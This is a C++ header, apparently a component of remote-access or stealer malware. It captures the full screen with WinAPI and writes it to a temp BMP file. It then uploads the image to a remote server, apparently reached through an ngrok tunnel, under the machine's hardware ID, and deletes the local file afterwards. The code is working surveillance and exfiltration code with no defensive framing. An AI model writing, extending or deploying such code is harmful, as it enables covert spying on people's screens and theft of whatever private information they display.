#pragma once
// ═══════════════════════════════════════════════════════════
//  ScreenCapture.hpp
//  Скриншот через WinAPI + cpr upload
// ═══════════════════════════════════════════════════════════

#include <string>
#include <vector>
#include <cpr/cpr.h>

inline std::vector<BYTE> takeScreenshot() {
    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    HDC hScrDC  = GetDC(NULL);
    HDC hMemDC  = CreateCompatibleDC(hScrDC);
    HBITMAP hBmp = CreateCompatibleBitmap(hScrDC, w, h);
    HGDIOBJ hOld = SelectObject(hMemDC, hBmp);
    BitBlt(hMemDC, 0, 0, w, h, hScrDC, x, y, SRCCOPY);

    BITMAPINFOHEADER bi = {};
    bi.biSize        = sizeof(BITMAPINFOHEADER);
    bi.biWidth       = w;
    bi.biHeight      = -h;
    bi.biPlanes      = 1;
    bi.biBitCount    = 32;
    bi.biCompression = BI_RGB;

    std::vector<BYTE> pixels(w * h * 4);
    GetDIBits(hMemDC, hBmp, 0, h, pixels.data(),
              (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    SelectObject(hMemDC, hOld);
    DeleteObject(hBmp);
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hScrDC);

    // BMP header
    BITMAPFILEHEADER bfh = {};
    bfh.bfType    = 0x4D42;
    bfh.bfSize    = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (DWORD)pixels.size();
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    std::vector<BYTE> bmp;
    bmp.resize(bfh.bfSize);
    memcpy(bmp.data(), &bfh, sizeof(bfh));
    memcpy(bmp.data() + sizeof(bfh), &bi, sizeof(bi));
    memcpy(bmp.data() + sizeof(bfh) + sizeof(bi), pixels.data(), pixels.size());
    return bmp;
}

inline void uploadScreenshot(const std::string& hwid,
                              const std::vector<BYTE>& bmp,
                              const std::string& serverUrl) {
    if (bmp.empty()) return;
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string fn = std::string(tmp) + "ng_shot.bmp";
    HANDLE hf = CreateFileA(fn.c_str(), GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hf == INVALID_HANDLE_VALUE) return;
    DWORD wr;
    WriteFile(hf, bmp.data(), (DWORD)bmp.size(), &wr, NULL);
    CloseHandle(hf);
    cpr::Post(
        cpr::Url{serverUrl + "/upload_screenshot/" + hwid},
        cpr::Multipart{{"file", cpr::File{fn}}},
        cpr::Header{{"ngrok-skip-browser-warning", "true"}}
    );
    DeleteFileA(fn.c_str());
}